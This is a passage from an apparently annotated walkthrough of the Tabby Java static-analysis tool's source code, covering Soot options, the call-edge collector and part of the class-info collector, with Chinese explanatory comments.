目前开启过程间分析不会进行实质上的过程间分析，开启当前flag只是为了解决依赖缺失的问题</span><span class="token comment">//        Options.v().set_no_writeout_body_releasing(true); // 当输出内容后不释放获取的body数据</span><span class="token comment">//        Options.v().set_drop_bodies_after_load(true); // 默认是true</span>        <span class="token class-name">Options</span><span class="token punctuation">.</span><span class="token function">v</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">set_oaat</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//        Options.v().set_no_bodies_for_excluded(true);</span><span class="token comment">//        Options.v().set_omit_excepting_unit_edges(true);</span>        <span class="token comment">// 设置自定义的package</span><span class="token comment">//        PhaseOptions.v().setPhaseOption("cg","on");</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre></li></ol><h3id="tabbycorecollectorcalledgecollector.java">tabby/core/collector/CallEdgeCollector.java</h3><ol type="1"><li><p>Code</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">tabby<span class="token punctuation">.</span>core<span class="token punctuation">.</span>collector</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>scheduling<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Async</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span></span><span class="token class-name">Service</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">lombok<span class="token punctuation">.</span>extern<span class="token punctuation">.</span>slf4j<span class="token punctuation">.</span></span><span class="token class-name">Slf4j</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">soot<span class="token punctuation">.</span></span><span class="token class-name">Modifier</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">soot<span class="token punctuation">.</span></span><span class="token class-name">SootMethod</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">soot<span class="token punctuation">.</span></span><span class="token class-name">Unit</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">soot<span class="token punctuation">.</span>jimple<span class="token punctuation">.</span></span><span class="token class-name">InvokeExpr</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">soot<span class="token punctuation">.</span>jimple<span class="token punctuation">.</span></span><span class="token class-name">JimpleBody</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">soot<span class="token punctuation">.</span>jimple<span class="token punctuation">.</span></span><span class="token class-name">Stmt</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">tabby<span class="token punctuation">.</span>core<span class="token punctuation">.</span>container<span class="token punctuation">.</span></span><span class="token class-name">DataContainer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">tabby<span class="token punctuation">.</span>core<span class="token punctuation">.</span>model<span class="token punctuation">.</span></span><span class="token class-name">DefaultInvokeModel</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">tabby<span class="token punctuation">.</span>core<span class="token punctuation">.</span>switcher<span class="token punctuation">.</span></span><span class="token class-name">Switcher</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">tabby<span class="token punctuation">.</span>dal<span class="token punctuation">.</span>caching<span class="token punctuation">.</span>bean<span class="token punctuation">.</span>ref<span class="token punctuation">.</span></span><span class="token class-name">MethodReference</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">tabby<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">TickTock</span></span><span class="token punctuation">;</span><span class="token comment">/** * @author wh1t3p1g * @since 2023/1/12 */</span><span class="token comment">// collect() 方法用于收集给定方法的调用边。</span><span class="token comment">// SootMethod method = methodRef.getMethod(); 获取方法的 Soot 对象。</span><span class="token comment">// if(method == null) &#123; 如果方法的 Soot 对象为 null，则表示无法提取方法的内容，因此不进行分析。</span><span class="token comment">// if(methodRef.isIgnore() || methodRef.isSink())&#123; 如果方法是忽略方法或 sink 方法，则不进行分析。</span><span class="token comment">// if(method.isStatic() &amp;&amp; method.getParameterCount() == 0)&#123; 如果方法是静态方法且没有参数，则此类方法不会影响分析，因此不进行分析。</span><span class="token comment">// if(method.isAbstract() || Modifier.isNative(method.getModifiers()) || method.isPhantom())&#123; 如果方法是抽象方法、本地方法或幽灵方法，则不进行分析。</span><span class="token comment">// JimpleBody body = (JimpleBody) Switcher.retrieveBody(method, method.getSignature()); 获取方法的 Jimple</span><span class="token annotation punctuation">@Slf4j</span><span class="token annotation punctuation">@Service</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CallEdgeCollector</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Async</span><span class="token punctuation">(</span><span class="token string">"tabby-collector"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">collect</span><span class="token punctuation">(</span><span class="token class-name">MethodReference</span> methodRef<span class="token punctuation">,</span> <span class="token class-name">DataContainer</span> dataContainer<span class="token punctuation">,</span> <span class="token class-name">TickTock</span> tickTock<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">try</span><span class="token punctuation">&#123;</span>            <span class="token class-name">SootMethod</span> method <span class="token operator">=</span> methodRef<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>method <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                tickTock<span class="token punctuation">.</span><span class="token function">countDown</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span><span class="token punctuation">;</span> <span class="token comment">// 提取不出内容，不分析</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>methodRef<span class="token punctuation">.</span><span class="token function">isIgnore</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">||</span> methodRef<span class="token punctuation">.</span><span class="token function">isSink</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                tickTock<span class="token punctuation">.</span><span class="token function">countDown</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span><span class="token punctuation">;</span> <span class="token comment">// 消除后续的调用边</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>method<span class="token punctuation">.</span><span class="token function">isStatic</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> method<span class="token punctuation">.</span><span class="token function">getParameterCount</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token comment">// 静态函数 且 函数入参数量为0 此类函数不影响分析</span>                methodRef<span class="token punctuation">.</span><span class="token function">setInitialed</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                tickTock<span class="token punctuation">.</span><span class="token function">countDown</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>method<span class="token punctuation">.</span><span class="token function">isAbstract</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                    <span class="token operator">||</span> <span class="token class-name">Modifier</span><span class="token punctuation">.</span><span class="token function">isNative</span><span class="token punctuation">(</span>method<span class="token punctuation">.</span><span class="token function">getModifiers</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                    <span class="token operator">||</span> method<span class="token punctuation">.</span><span class="token function">isPhantom</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                methodRef<span class="token punctuation">.</span><span class="token function">setInitialed</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                methodRef<span class="token punctuation">.</span><span class="token function">setActionInitialed</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                tickTock<span class="token punctuation">.</span><span class="token function">countDown</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token comment">// JimpleBody 对象是 Soot 表示的中间表示 (IR)。JimpleBody 对象包含了方法的控制流和数据流信息。</span>            <span class="token comment">// Tabby 应用程序会在分析方法时获取方法的 JimpleBody 对象。JimpleBody 对象可以用于进行调用图构建、数据流分析、控制流分析等操作。            </span>            <span class="token class-name">JimpleBody</span> body <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">JimpleBody</span><span class="token punctuation">)</span> <span class="token class-name">Switcher</span><span class="token punctuation">.</span><span class="token function">retrieveBody</span><span class="token punctuation">(</span>method<span class="token punctuation">,</span> method<span class="token punctuation">.</span><span class="token function">getSignature</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>body <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                tickTock<span class="token punctuation">.</span><span class="token function">countDown</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token class-name">DefaultInvokeModel</span> model <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DefaultInvokeModel</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">Unit</span> unit<span class="token operator">:</span>body<span class="token punctuation">.</span><span class="token function">getUnits</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token class-name">Stmt</span> stmt <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Stmt</span><span class="token punctuation">)</span> unit<span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>stmt<span class="token punctuation">.</span><span class="token function">containsInvokeExpr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                    <span class="token class-name">InvokeExpr</span> ie <span class="token operator">=</span> stmt<span class="token punctuation">.</span><span class="token function">getInvokeExpr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token class-name">SootMethod</span> targetMethod <span class="token operator">=</span> ie<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token class-name">MethodReference</span> targetMethodRef                            <span class="token operator">=</span> dataContainer<span class="token punctuation">.</span><span class="token function">getOrAddMethodRef</span><span class="token punctuation">(</span>ie<span class="token punctuation">.</span><span class="token function">getMethodRef</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> targetMethod<span class="token punctuation">)</span><span class="token punctuation">;</span>                    model<span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span>stmt<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> methodRef<span class="token punctuation">,</span> targetMethodRef<span class="token punctuation">,</span> dataContainer<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">RuntimeException</span> e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//            log.error(e.getMessage());</span>            log<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"Something error on call graph. "</span><span class="token operator">+</span>methodRef<span class="token punctuation">.</span><span class="token function">getSignature</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            log<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//            e.printStackTrace();</span>        <span class="token punctuation">&#125;</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>e <span class="token keyword">instanceof</span> <span class="token class-name">InterruptedException</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                log<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"Thread interrupted. "</span> <span class="token operator">+</span> methodRef<span class="token punctuation">.</span><span class="token function">getSignature</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                log<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"Something error on call graph. "</span><span class="token operator">+</span>methodRef<span class="token punctuation">.</span><span class="token function">getSignature</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        tickTock<span class="token punctuation">.</span><span class="token function">countDown</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre></li></ol><h3id="tabbycorecollectorclassinfocollector.java">tabby/core/collector/ClassInfoCollector.java</h3><ol type="1"><li><p>Code</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">tabby<span class="token punctuation">.</span>core<span class="token punctuation">.</span>collector</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">ArrayList</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Arrays</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashSet</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">List</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Set</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">CompletableFuture</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>beans<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Autowired</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>scheduling<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Async</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span></span><span class="token class-name">Service</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">soot<span class="token punctuation">.</span></span><span class="token class-name">SootClass</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">soot<span class="token punctuation">.</span></span><span class="token class-name">SootMethod</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">soot<span class="token punctuation">.</span>tagkit<span class="token punctuation">.</span></span><span class="token class-name">AnnotationTag</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">soot<span class="token punctuation">.</span>tagkit<span class="token punctuation">.</span></span><span class="token class-name">Tag</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">soot<span class="token punctuation">.</span>tagkit<span class="token punctuation">.</span></span><span class="token class-name">VisibilityAnnotationTag</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">tabby<span class="token punctuation">.</span>core<span class="token punctuation">.</span>container<span class="token punctuation">.</span></span><span class="token class-name">DataContainer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">tabby<span class="token punctuation">.</span>core<span class="token punctuation">.</span>container<span class="token punctuation">.</span></span><span class="token class-name">RulesContainer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">tabby<span class="token punctuation">.</span>core<span class="token punctuation">.</span>data<span class="token punctuation">.</span></span><span class="token class-name">TabbyRule</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">tabby<span class="token punctuation">.</span>dal<span class="token punctuation">.</span>caching<span class="token punctuation">.</span>bean<span class="token punctuation">.</span>edge<span class="token punctuation">.</span></span><span class="token class-name">Has</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">tabby<span class="token punctuation">.</span>dal<span class="token punctuation">.</span>caching<span class="token punctuation">.</span>bean<span class="token punctuation">.</span>ref<span class="token punctuation">.</span></span><span class="token class-name">ClassReference</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">tabby<span class="token punctuation">.</span>dal<span class="token punctuation">.</span>caching<span class="token punctuation">.</span>bean<span class="token punctuation">.</span>ref<span class="token punctuation">.</span></span><span class="token class-name">MethodReference</span></span><span class="token punctuation">;</span><span class="token comment">/** * @author wh1t3p1g * @since 2021/8/31 */</span><span class="token annotation punctuation">@Service</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ClassInfoCollector</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Autowired</span>    <span class="token keyword">private</span> <span class="token class-name">DataContainer</span> dataContainer<span class="token punctuation">;</span>    <span class="token comment">// collect() 方法用于收集类信息。</span>    <span class="token annotation punctuation">@Async</span><span class="token punctuation">(</span><span class="token string">"tabby-collector"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">CompletableFuture</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">ClassReference</span><span class="token punctuation">></span></span> <span class="token function">collect</span><span class="token punctuation">(</span><span class="token class-name">SootClass</span> cls<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token class-name">CompletableFuture</span><span class="token punctuation">.</span><span class="token function">completedFuture</span><span class="token punctuation">(</span><span class="token function">collect0</span><span class="token punctuation">(</span>cls<span class="token punctuation">,</span> dataContainer<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * 仅收集classRef，不保存到内存     * @param cls     * @param dataContainer     * @return     */</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">ClassReference</span> <span class="token function">collect0</span><span class="token punctuation">(</span><span class="token class-name">SootClass</span> cls<span class="token punctuation">,</span> <span class="token class-name">DataContainer</span> dataContainer<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">ClassReference</span> classRef <span class="token operator">=</span> <span class="token class-name">ClassReference</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>cls<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Set</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> relatedClassnames <span class="token operator">=</span> <span class="token function">getAllFatherNodes</span><span class="token punctuation">(</span>cls<span class="token punctuation">)</span><span class="token punctuation">;</span>        classRef<span class="token punctuation">.</span><span class="token function">setSerializable</span><span class="token punctuation">(</span>relatedClassnames<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"java.io.Serializable"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        classRef<span class="token punctuation">.</span><span class="token function">setStrutsAction</span><span class="token punctuation">(</span>relatedClassnames<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"com.opensymphony.xwork2.ActionSupport"</span><span class="token punctuation">)</span>                <span class="token operator">||</span> relatedClassnames<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"com.opensymphony.xwork2.Action"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 提取类函数信息</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>cls<span class="token punctuation">.</span><span class="token function">getMethodCount</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">SootMethod</span> method <span class="token operator">:</span> cls<span class="token punctuation">.</span><span class="token function">getMethods</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token function">extractMethodInfo</span><span class="token punctuation">(</span>method<span class="token punctuation">,</span> classRef<span class="token punctuation">,</span> relatedClassnames<span class="token punctuation">,</span> dataContainer<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> classRef<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * 提取函数基础信息，并保存到内存中     * @param method     * @param ref     */</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">extractMethodInfo</span><span class="token punctuation">(</span><span class="token class-name">SootMethod</span> method<span class="token punctuation">,</span>                                         <span class="token class-name">ClassReference</span> ref<span class="token punctuation">,</span>                                         <span class="token class-name">Set</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> relatedClassnames<span class="token punctuation">,</span>                                         <span class="token class-name">DataContainer</span> dataContainer    <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">RulesContainer</span> rulesContainer <span class="token operator">=</span> dataContainer<span class="token punctuation">.</span><span class="token function">getRulesContainer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> classname <span class="token operator">=</span> ref<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">MethodReference</span> methodRef <span class="token operator">=</span> <span class="token class-name">MethodReference</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>classname<span class="token punctuation">,</span> method<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">TabbyRule<span class="token punctuation">.</span>Rule</span> rule <span class="token operator">=</span> rulesContainer<span class="token punctuation">.</span><span class="token function">getRule</span><span class="token punctuation">(</span>classname<span class="token punctuation">,</span> methodRef<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>rule <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 对于ignore类型，支持多级父类和接口的规则查找</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">String</span> relatedClassname <span class="token operator">:</span> relatedClassnames<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">TabbyRule<span class="token punctuation">.</span>Rule</span> tmpRule <span class="token operator">=</span> rulesContainer<span class="token punctuation">.</span><span class="token function">getRule</span><span class="token punctuation">(</span>relatedClassname<span class="token punctuation">,</span> methodRef<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>tmpRule <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> tmpRule<span class="token punctuation">.</span><span class="token function">isIgnore</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    rule <span class="token operator">=</span> tmpRule<span class="token punctuation">;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">boolean</span> isSink <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token keyword">boolean</span> isIgnore <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token keyword">boolean</span> isSource <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>rule <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>rule<span class="token punctuation">.</span><span class="token function">isEmptySignaturesList</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">||</span> rule<span class="token punctuation">.</span><span class="token function">isContainsSignature</span><span class="token punctuation">(</span>methodRef<span class="token punctuation">.</span><span class="token function">getSignature</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token comment">// 当rule存在signatures时，该rule为精确匹配，否则为模糊匹配，仅匹配函数名是否符合</span>            isSink <span class="token operator">=</span> rule<span class="token punctuation">.</span><span class="token function">isSink</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            isIgnore <span class="token operator">=</span> rule<span class="token punctuation">.</span><span class="token function">isIgnore</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            isSource <span class="token operator">=</span> rule<span class="token punctuation">.</span><span class="token function">isSource</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// 此处，对于sink、know、ignore类型的规则，直接选取先验知识</span>            <span class="token comment">// 对于source类型 不赋予其actions和polluted</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>isSource<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">></span></span> actions <span class="token operator">=</span> rule<span class="token punctuation">.</span><span class="token function">getActions</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span> polluted <span class="token operator">=</span> rule<span class="token punctuation">.</span><span class="token function">getPolluted</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>isSink<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                    methodRef<span class="token punctuation">.</span><span class="token function">setVul</span><span class="token punctuation">(</span>rule<span class="token punctuation">.</span><span class="token function">getVul</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                methodRef<span class="token punctuation">.</span><span class="token function">setActions</span><span class="token punctuation">(</span>actions<span class="token operator">!=</span><span class="token keyword">null</span><span class="token operator">?</span>actions<span class="token operator">:</span><span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span 